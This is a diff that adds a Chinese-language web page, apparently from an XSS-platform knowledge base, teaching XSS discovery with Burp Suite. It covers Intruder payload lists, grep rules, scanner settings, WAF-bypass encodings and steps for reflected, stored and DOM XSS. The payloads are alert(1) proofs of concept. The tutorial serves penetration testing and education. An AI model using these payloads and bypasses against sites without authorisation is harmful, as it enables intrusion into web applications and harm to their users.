@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+<meta name="description" content="Burp Suite进行XSS漏洞挖掘完整教程，包括Intruder配置、Payload字典、XSS Scanner使用、手工测试技巧等实战内容。">
+<meta name="keywords" content="Burp Suite,XSS测试,漏洞挖掘,Intruder,Scanner,Web安全,渗透测试">
+<title>Burp Suite进行XSS漏洞挖掘实战教程 - XSS安全知识库</title>
+<link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="../static/libs/fontawesome/css/all.min.css" rel="stylesheet"><link href="../static/css/style.css" rel="stylesheet"><link href="../static/libs/prism/css/prism-tomorrow.min.css" rel="stylesheet">
+<style>.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:3rem 0;border-bottom:2px solid #00ff41}.content{max-width:900px;margin:2rem auto;padding:2rem;background:rgba(0,0,0,0.3);border-radius:8px}h2{color:#00ff41;margin-top:2.5rem;padding-bottom:0.5rem;border-bottom:2px solid rgba(0,255,65,0.3)}pre{background:rgba(0,0,0,0.5);padding:1.5rem;border-radius:8px;border-left:3px solid #00ff41}        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+<div class="container"><nav aria-label="breadcrumb"><ol class="breadcrumb" style="background:transparent;padding:1rem 0"><li class="breadcrumb-item"><a href="../index.html" style="color:#00ff41">首页</a></li><li class="breadcrumb-item"><a href="../wiki.html" style="color:#00ff41">知识库</a></li><li class="breadcrumb-item active">Burp Suite XSS</li></ol></nav></div>
+<div class="header"><div class="container text-center"><h1 style="font-size:2.5rem;color:#fff"><i class="fas fa-bug"></i> Burp Suite进行XSS漏洞挖掘实战</h1><div style="color:#999">18分钟阅读 | 工具使用</div></div></div>
+<div class="container"><div class="content" style="color:#ccc;line-height:1.8">
+<h2><i class="fas fa-rocket"></i> 一、环境配置</h2>
+<h3>1.1 代理设置</h3>
+<pre><code class="language-javascript">// 浏览器代理配置
+地址: 127.0.0.1
+端口: 8080
+
+// Burp Suite设置
+Proxy → Options → Proxy Listeners
+绑定到所有接口（如需远程测试）</code></pre>
+
+<h3>1.2 安装CA证书</h3>
+<p>访问 http://burp 下载CA证书，导入浏览器以拦截HTTPS流量。</p>
+
+<h2><i class="fas fa-search"></i> 二、使用Proxy发现XSS</h2>
+<h3>2.1 拦截请求</h3>
+<pre><code class="language-markup">// 在Proxy → Intercept中修改请求
+原始请求:
+POST /comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+message=Hello
+
+修改为:
+message=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+<h3>2.2 HTTP History分析</h3>
+<p>在Proxy → HTTP history中查找：</p>
+<ul><li>包含用户输入的响应</li><li>未编码的特殊字符</li><li>JavaScript上下文</li><li>HTML属性上下文</li></ul>
+
+<h2><i class="fas fa-bomb"></i> 三、使用Intruder爆破XSS</h2>
+<h3>3.1 配置Payload位置</h3>
+<pre><code class="language-markup">// 标记注入点
+POST /search HTTP/1.1
+
+q=§test§</code></pre>
+
+<h3>3.2 Payload设置</h3>
+<pre><code class="language-javascript">// Payload类型：Simple list
+// 添加XSS Payload字典：
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src=javascript:alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;marquee onstart=alert(1)&gt;
+javascript:alert(1)
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+<h3>3.3 Grep匹配</h3>
+<pre><code class="language-javascript">// Options → Grep - Match
+添加匹配规则：
+- alert(1)
+- onerror=
+- &lt;script&gt;
+- javascript:
+
+// 用于快速识别成功的Payload</code></pre>
+
+<h2><i class="fas fa-robot"></i> 四、使用Scanner自动扫描</h2>
+<h3>4.1 主动扫描</h3>
+<pre><code class="language-javascript">// 右键点击请求 → Scan
+配置:
+- Crawl and Audit
+- Audit checks: 选择所有XSS检查
+- Resource Pool: Fast scan</code></pre>
+
+<h3>4.2 自定义扫描配置</h3>
+<pre><code class="language-javascript">// Scanner → Options → Active Scanning
+启用检查：
+☑ Cross-site scripting (reflected)
+☑ Cross-site scripting (stored)
+☑ Client-side prototype pollution
+☑ DOM-based XSS
+
+调整插入点:
+☑ URL参数值
+☑ Body参数值
+☑ Cookie
+☑ HTTP头</code></pre>
+
+<h2><i class="fas fa-filter"></i> 五、绕过WAF技巧</h2>
+<h3>5.1 使用Payload Processing</h3>
+<pre><code class="language-javascript">// Intruder → Payloads → Payload Processing
+添加规则：
+1. URL-encode: All characters
+2. HTML-encode: &lt; &gt; " '
+3. Base64-encode
+4. Add prefix: /**/
+5. Add suffix: /**/</code></pre>
+
+<h3>5.2 大小写混淆</h3>
+<pre><code class="language-markup">&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;ImG sRc=X oNeRrOr=alert(1)&gt;</code></pre>
+
+<h3>5.3 编码绕过</h3>
+<pre><code class="language-javascript">// HTML实体编码
+&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"&gt;
+
+// Unicode编码
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;
+
+// 十六进制编码
+&lt;img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)"&gt;</code></pre>
+
+<h2><i class="fas fa-tools"></i> 六、扩展插件</h2>
+<h3>6.1 XSS Validator</h3>
+<p>自动化XSS验证插件，配合PhantomJS使用。</p>
+<pre><code class="language-javascript">// 安装
+Extender → BApp Store → XSS Validator
+
+// 配置
+添加Payload: &lt;script src="https://xss-validator-url"&gt;&lt;/script&gt;</code></pre>
+
+<h3>6.2 CO2 (Custom Output)</h3>
+<p>强大的请求定制和重放工具。</p>
+
+<h3>6.3 Burp Bounty</h3>
+<p>基于规则的漏洞扫描增强插件。</p>
+
+<h2><i class="fas fa-code"></i> 七、实战案例</h2>
+<h3>7.1 反射型XSS挖掘</h3>
+<pre><code class="language-javascript">// 步骤：
+1. Proxy拦截搜索请求
+2. 发送到Repeater
+3. 修改参数: q=&lt;script&gt;alert(1)&lt;/script&gt;
+4. 观察响应，查找未编码的输出
+5. 测试不同上下文的Payload
+6. 确认漏洞后提交报告</code></pre>
+
+<h3>7.2 存储型XSS挖掘</h3>
+<pre><code class="language-javascript">// 流程：
+1. 找到用户输入存储点（评论、个人资料等）
+2. 使用Intruder批量测试Payload
+3. 访问存储数据展示页面
+4. Proxy → HTTP history查找响应中的Payload
+5. 验证XSS执行</code></pre>
+
+<h3>7.3 DOM XSS挖掘</h3>
+<pre><code class="language-javascript">// 查找JavaScript中的危险函数
+使用Burp搜索功能：
+Target → Site map → 右键 → Engagement tools → Find comments and scripts
+
+搜索关键词：
+- document.write
+- innerHTML
+- location.hash
+- eval
+- setTimeout
+- setInterval</code></pre>
+
+<h2><i class="fas fa-book"></i> 八、最佳实践</h2>
+<ul><li>始终从最简单的Payload开始测试</li><li>记录每次测试的请求和响应</li><li>使用Burp Collaborator检测盲XSS</li><li>测试所有输入点，包括HTTP头</li><li>保存成功的Payload作为字典</li><li>定期更新Burp Suite和扩展</li></ul>
+
+<h2><i class="fas fa-graduation-cap"></i> 总结</h2>
+<p>Burp Suite是XSS挖掘的强大工具，掌握：</p>
+<ol><li>Proxy拦截和修改请求</li><li>Intruder自动化测试</li><li>Scanner自动扫描</li><li>Repeater手工验证</li><li>扩展插件增强功能</li></ol>
+
+<div style="display:flex;justify-content:space-between;margin-top:3rem;padding-top:2rem;border-top:1px solid #333">
+<a href="xss-platform-usage.html" style="color:#00ff41;text-decoration:none"><i class="fas fa-arrow-left"></i> 上一篇</a>
+<a href="../wiki.html" style="color:#00ff41;text-decoration:none">返回知识库</a>
+<a href="keylogger.html" style="color:#00ff41;text-decoration:none">下一篇 <i class="fas fa-arrow-right"></i></a>
+</div>
+</div></div>
+<footer class="footer"><div class="container-fluid"><div style="text-align:center;color:#999">© 2025 蓝莲花XSS平台</div></div></footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+<script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="../static/libs/prism/js/prism.min.js"></script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body></html>
